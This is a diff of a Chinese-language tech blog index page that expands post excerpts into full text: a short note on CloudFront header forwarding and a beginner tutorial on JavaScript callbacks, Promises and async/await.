-        <div class="level is-mobile">
-            <div class="level-start">
-                <div class="level-item">
-                <a class="button is-size-7 is-light" href="/2019/01/08/ssh-tunnel/#more">繼續閱讀</a>
-                </div>
-            </div>
-        </div>
         
         
     </div>
@@ -587,17 +1213,28 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
             
         </h1>
         <div class="content">
-            <p>最近在使用 CloudFront Header forward 的設定<br>CloudFront 預設會把 <code>User-Agent</code> 這個 header 替換成 <code>Amazon CloudFront</code><br>於是開始研究起要怎麼把原始的 User Agent 完整的帶到 Origin 去</p>
+            <p>最近在使用 CloudFront Header forward 的設定
+CloudFront 預設會把 <code>User-Agent</code> 這個 header 替換成 <code>Amazon CloudFront</code>
+於是開始研究起要怎麼把原始的 User Agent 完整的帶到 Origin 去</p>
+<p>&lt;!-- more --&gt;</p>
+<p>但由於 CF 上面的設定寫的不是很清楚
+於是發現以下這篇 <a href="https://aws.amazon.com/blogs/aws/enhanced-cloudfront-customization/">AWS 官方文章</a>
+這裡直接做一個總結</p>
+<ol>
+<li>None: 使用 CloudFront 原生的行為 (例如替換 <code>User-Agent</code>)</li>
+<li>Whitelists: 把 whitelists 裡面的參數，<strong>完整不動</strong> 的 Forward 到 Orign 去使用</li>
+<li>ALL: 把所有參數都 forward 到 Origin 去</li>
+</ol>
+<p>下面是一個 whitelist 的簡單範例</p>
+<p><img src="https://i.imgur.com/Dy57usH.png" alt></p>
+<p>以這張圖的設定的來說，代表 <code>User-Agent</code> 不會被 CloudFront 給自動替換掉
+而是會拿原生<code>User-Agent</code>直接 forward 到 Origin 去</p>
+<p>另外這邊要提醒，Cloudfront 預設是不會 Forward Headers, Cookies 和 Query String 的
+這邊要特別注意，要特別設定才可以
+那至於 Cookie 以及 Query String 的設定看上面就明瞭了</p>
+
         </div>
         
-        
-        <div class="level is-mobile">
-            <div class="level-start">
-                <div class="level-item">
-                <a class="button is-size-7 is-light" href="/2018/09/05/cloudfont-setting/#more">繼續閱讀</a>
-                </div>
-            </div>
-        </div>
         
         
     </div>
@@ -641,18 +1278,58 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
             
         </h1>
         <div class="content">
-            <p><span style="color: green">[Update 2019-05-02]</span> 關於 Error Handing 可以看<a href="/2019/05/02/promise-2/">下一篇文章</a></p>
-<p>這篇主要紀錄 callback, promise, async/await 的使用方式<br>以及為何會從到 callback 和 promise 的 hell world 進入到 async/await 這兩兄弟的世界<br>建議閱讀的人要有 Javascript 的基礎概念，包括對 non-blocking, event-driven 的觀念有一些涉略</p>
+            <p>&lt;span style=&quot;color: green&quot;&gt;[Update 2019-05-02]&lt;/span&gt; 關於 Error Handing 可以看<a href="/2019/05/02/promise-2/">下一篇文章</a></p>
+<p>這篇主要紀錄 callback, promise, async/await 的使用方式
+以及為何會從到 callback 和 promise 的 hell world 進入到 async/await 這兩兄弟的世界
+建議閱讀的人要有 Javascript 的基礎概念，包括對 non-blocking, event-driven 的觀念有一些涉略</p>
+<p>&lt;!--more--&gt;</p>
+<h2><span id="callback">Callback</span></h2>
+<p>Callback 是 JS 很常用的一種使用方式
+簡單來說，就是把 function 當作參數傳進去使用
+以下是簡單的使用範例
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"This test function is done."</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params">callback</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"This is main start."</span>)</span><br><span class="line">    callback()</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"This is main end."</span>)</span><br><span class="line">&#125;</span><br><span class="line">main(test)</span><br><span class="line"><span class="comment">// This is main start.</span></span><br><span class="line"><span class="comment">// This test function is done.</span></span><br><span class="line"><span class="comment">// This is main end.</span></span><br></pre></td></tr></table></figure></p>
+<p>但是 callback 使用上往往沒那麼簡單，基本上都會牽扯到 API 相關的用法
+所以會變成下面這樣的方式
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 這邊模擬 test 這個 function 去 call 其他 API 要等待的情況</span></span><br><span class="line">    <span class="comment">// 等了一秒後才會執行 console.log 這個函式</span></span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span>=&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"This test function is done."</span>)</span><br><span class="line">    &#125;, <span class="number">1000</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params">callback</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"This is main start."</span>)</span><br><span class="line">    callback()</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"This is main end."</span>)</span><br><span class="line">&#125;</span><br><span class="line">main(test)</span><br><span class="line"><span class="comment">// This is main start.</span></span><br><span class="line"><span class="comment">// This is main end.</span></span><br><span class="line"><span class="comment">// This test function is done.</span></span><br></pre></td></tr></table></figure></p>
+<p>這邊會發現，<code>This is main end.</code> 反而先執行印出來了, 這裡牽扯到 non-blocking 的概念, 將會放在別的章節重新介紹
+那如果我想要 <code>This is main end.</code> 在最下面的話該怎麼做呢?
+做法上只要把執行 <code>This is main end.</code> 的函示也當成 callback 傳進去就可以按照順序執行下來了
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">callback2</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 這邊模擬 test 這個 function 去 call 其他 API 要等待的情況</span></span><br><span class="line">    <span class="comment">// 等了一秒後才會執行 console.log 這個函式</span></span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"This test function is done."</span>)</span><br><span class="line">        callback2()</span><br><span class="line">    &#125;, <span class="number">1000</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params">callback</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"This is main start."</span>)</span><br><span class="line">    callback(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"This is main end."</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">main(test)</span><br><span class="line"><span class="comment">// This is main start.</span></span><br><span class="line"><span class="comment">// This test function is done.</span></span><br><span class="line"><span class="comment">// This is main end.</span></span><br></pre></td></tr></table></figure></p>
+<p>用 callback 解決的非同步的問題, 但是當越來越多 callback 串再一起
+就會變成 callback hell, 如同下面這樣
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">api1</span>(<span class="params">callback</span>) </span>&#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"Done with api1"</span>)</span><br><span class="line">        callback()</span><br><span class="line">    &#125;, <span class="number">2000</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">api2</span>(<span class="params">callback</span>) </span>&#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"Done with api2"</span>)</span><br><span class="line">        callback()</span><br><span class="line">    &#125;, <span class="number">1000</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params">callback</span>) </span>&#123;</span><br><span class="line">    api1(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        api2(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">            callback()</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line">main(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"All function is done."</span>)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// "Done with api1"</span></span><br><span class="line"><span class="comment">// "Done with api2"</span></span><br><span class="line"><span class="comment">// "All function is done."</span></span><br></pre></td></tr></table></figure></p>
+<p>當越來越多 API 要<code>按照順序</code>做下去的時候就會很恐怖了，會變成這樣
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">api1(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    api2(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        api3(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">            api4(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">                <span class="comment">// bla bla bla</span></span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p>
+<h2><span id="promise">Promise</span></h2>
+<p>介紹完 callback 之後，一定要介紹他的好兄弟 Promise
+Promise 是一個可以對非同步進行處理以及進行各種操作的東西
+通常 Promise 會包含三種狀態 <code>resolve</code> <code>reject</code> <code>pending</code>
+<code>resolve</code> 代表成功 <code>rejetc</code> 代表失敗, <code>pending</code> 代表還在處理中, 結束狀態未知
+以下有兩種方式得知結果
+<code>resolve</code> 會觸發 <code>onSuccessful</code>, reject 會觸發 <code>onFailed</code>
+<code>promise.then(onSuccessful, onFailed)</code>
+<code>promise.then(onSuccessful).catch(onFailed)</code>
+以下是 Promise 的使用範例
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">number</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (number === <span class="number">1</span>) &#123;</span><br><span class="line">            resolve(<span class="string">"Success"</span>)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            reject(<span class="string">"Failed"</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    test(<span class="number">1</span>).then(<span class="function">(<span class="params">result</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// result === "Success"</span></span><br><span class="line">        <span class="built_in">console</span>.log(result)</span><br><span class="line">    &#125;).catch(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// 不會被執行, 因為狀態是成功</span></span><br><span class="line">    &#125;)</span><br><span class="line">    test(<span class="number">2</span>).then(<span class="function">(<span class="params">result</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// 不會被執行, 因為狀態是成功</span></span><br><span class="line">        <span class="built_in">console</span>.log(result)</span><br><span class="line">    &#125;).catch(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// error === "Failed"</span></span><br><span class="line">        <span class="built_in">console</span>.log(error)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>Promise 的基本介紹完之後，一定都會提到一個 Promise Chain 的概念
+簡單來說就是我可以一直 <code>then</code> 下去，直到海枯石爛, 只要我在 <code>resolve</code> 或是 <code>reject</code> 的狀態下，<code>return</code> 任何東西都可以 <code>then</code> 下去
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">number</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (number === <span class="number">1</span>) &#123;</span><br><span class="line">            resolve(<span class="string">"Success"</span>)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            reject(<span class="string">"Failed"</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    test(<span class="number">1</span>).then(<span class="function">(<span class="params">result</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// result === "Success"</span></span><br><span class="line">        <span class="built_in">console</span>.log(result)</span><br><span class="line">        <span class="comment">// return "Next One"</span></span><br><span class="line">        <span class="keyword">return</span> test(<span class="number">1</span>)</span><br><span class="line">    &#125;).then(<span class="function">(<span class="params">result</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// result === "Next One"</span></span><br><span class="line">        <span class="built_in">console</span>.log(result)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    test(<span class="number">2</span>).then(<span class="function">(<span class="params">result</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// result === "Success"</span></span><br><span class="line">        <span class="built_in">console</span>.log(result)</span><br><span class="line">        <span class="comment">// return Promise 的物件也是可以的喔</span></span><br><span class="line">        <span class="keyword">return</span> test(<span class="number">1</span>)</span><br><span class="line">    &#125;).then(<span class="function">(<span class="params">result</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// result === "Success"</span></span><br><span class="line">        <span class="built_in">console</span>.log(result)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>但是按照這樣的寫法下去, 又會變成另一種 then hell 的概念
+於是接下來出現了 async/await 這兩兄弟</p>
+<h2><span id="asyncawait">async/await</span></h2>
+<p><code>async/await</code> 基本上是一種語法糖, 把 Promise 的重新包裝起來然後做使用
+可以不用再透過 <code>then</code> 的方式去執行 Promise
+使用方式會變成以下這樣
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">number</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (number === <span class="number">1</span>) &#123;</span><br><span class="line">            resolve(<span class="string">"Success"</span>)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            reject(<span class="string">"Failed"</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> result = <span class="keyword">await</span> test(<span class="number">1</span>)</span><br><span class="line">    <span class="comment">// result === "Success"</span></span><br><span class="line">    <span class="built_in">console</span>.log(result)</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br></pre></td></tr></table></figure></p>
+<p>記得在使用 <code>await</code> 的時候, function 前面一定要加上 <code>async</code>
+所以當我有很多 API 要使用的話, 就會變得很乾淨
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> result1 = <span class="keyword">await</span> test1()</span><br><span class="line">    <span class="keyword">let</span> result2 = <span class="keyword">await</span> test2()</span><br><span class="line">    <span class="keyword">let</span> result3 = <span class="keyword">await</span> test3()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<h2><span id="結語">結語</span></h2>
+<p>這 Part 主要是快速介紹使用教學方式
+下一部分會介紹在這三種使用方式裡面是如何做到 <a href="/2019/05/02/promise-2/">Error Handling</a></p>
+
         </div>
         
-        
-        <div class="level is-mobile">
-            <div class="level-start">
-                <div class="level-item">
-                <a class="button is-size-7 is-light" href="/2018/07/22/promise/#more">繼續閱讀</a>
-                </div>
-            </div>
-        </div>
         
         
     </div>
